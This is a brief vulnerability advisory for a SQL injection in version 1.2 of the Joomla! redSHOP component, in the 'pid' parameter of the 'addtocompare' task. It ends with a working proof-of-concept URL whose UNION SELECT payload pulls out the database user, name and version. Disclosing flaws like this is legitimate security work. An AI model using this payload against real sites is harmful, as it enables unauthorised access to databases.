Joomla! redSHOP component v1.2 SQL Injection
--------------------------------------------

== Description ==
- Product: Joomla! redSHOP component
- Product link: http://redcomponent.com/redcomponent/redshop
- Vendor: redcomponent
- Affected versions: version 1.2 is vulnerable. Other versions might
be affected as well.
- Vulnerability discovered by: Matias Fontanini

== Vulnerability ==
When using the "addtocompare" task, the component does not correctly
sanitize the "pid" parameter before using it to construct SQL queries,
making it vulnerable to SQL Injection attacks.

The following proof of concept request retrieves the database user,
name and version:

http://example.com/index.php?tmpl=component&option=com_redshop&view=product&task=addtocompare&pid=24%22%20and%201=0%20union%20select%201,2,3,4,5,6,7,8,concat_ws%280x203a20,%20user%28%29,%20database%28%29,%20version%28%29%29,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63%23&cmd=add&cid=20&sid=0.6886686905513422
